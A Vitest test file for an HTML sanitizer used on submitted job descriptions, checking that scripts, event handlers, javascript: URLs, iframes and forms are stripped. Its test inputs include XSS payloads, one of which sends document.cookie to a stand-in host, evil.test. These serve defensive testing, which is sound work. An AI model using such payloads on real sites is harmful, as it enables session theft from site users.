import { describe, it, expect } from 'vitest'
import { sanitizeDescription } from './sanitize'

describe('sanitizeDescription', () => {
  it('returns an empty string for missing input', () => {
    expect(sanitizeDescription(null)).toBe('')
    expect(sanitizeDescription(undefined)).toBe('')
    expect(sanitizeDescription('')).toBe('')
  })

  it('keeps the formatting the editor can produce', () => {
    const html =
      '<h2>Role</h2><p><strong>Lead</strong> the <em>team</em>.</p>' +
      '<ul><li>One</li><li>Two</li></ul><blockquote>Quote</blockquote><hr>'
    expect(sanitizeDescription(html)).toBe(html)
  })

  it('keeps links and images with their attributes', () => {
    const html = '<p><a href="https://example.com" title="x">Apply</a></p>'
    expect(sanitizeDescription(html)).toContain('href="https://example.com"')

    const img = '<img src="https://example.com/logo.png" alt="Logo">'
    expect(sanitizeDescription(img)).toContain('src="https://example.com/logo.png"')
  })

  // ── the actual vulnerability ──────────────────────────────────────────────

  it('strips script tags', () => {
    const out = sanitizeDescription('<p>Hi</p><script>alert(1)</script>')
    expect(out).not.toContain('script')
    expect(out).toContain('<p>Hi</p>')
  })

  it('strips event-handler attributes', () => {
    // The payload an admin cannot see while reviewing rendered output.
    const out = sanitizeDescription('<img src=x onerror="alert(1)">')
    expect(out).not.toContain('onerror')

    expect(sanitizeDescription('<p onclick="alert(1)">t</p>')).not.toContain('onclick')
    expect(sanitizeDescription('<div onload="alert(1)">t</div>')).not.toContain('onload')
  })

  it('strips javascript: URLs', () => {
    const out = sanitizeDescription('<a href="javascript:alert(1)">click</a>')
    expect(out).not.toContain('javascript:')
  })

  it('strips iframes, objects and embeds', () => {
    const out = sanitizeDescription(
      '<iframe src="https://evil.test"></iframe><object data="x"></object><embed src="x">'
    )
    expect(out).not.toContain('iframe')
    expect(out).not.toContain('object')
    expect(out).not.toContain('embed')
  })

  it('strips style and form elements', () => {
    expect(sanitizeDescription('<style>body{display:none}</style>')).not.toContain('style')
    const form = sanitizeDescription('<form action="https://evil.test"><input name="p"></form>')
    expect(form).not.toContain('<form')
    expect(form).not.toContain('<input')
  })

  it('forces rel="noopener noreferrer" on links that open a new tab', () => {
    // Without this, the opened page gets a handle on window.opener.
    const out = sanitizeDescription('<a href="https://example.com" target="_blank">x</a>')
    expect(out).toContain('rel="noopener noreferrer"')
  })

  it('survives the approve-route path: submitted HTML stays inert', () => {
    // What a malicious submitter would send, end to end.
    const payload =
      '<p>Great role!</p><img src=x onerror="fetch(\'https://evil.test?c=\'+document.cookie)">'
    const out = sanitizeDescription(payload)
    expect(out).toContain('<p>Great role!</p>')
    expect(out).not.toContain('onerror')
    expect(out).not.toContain('evil.test')
  })
})
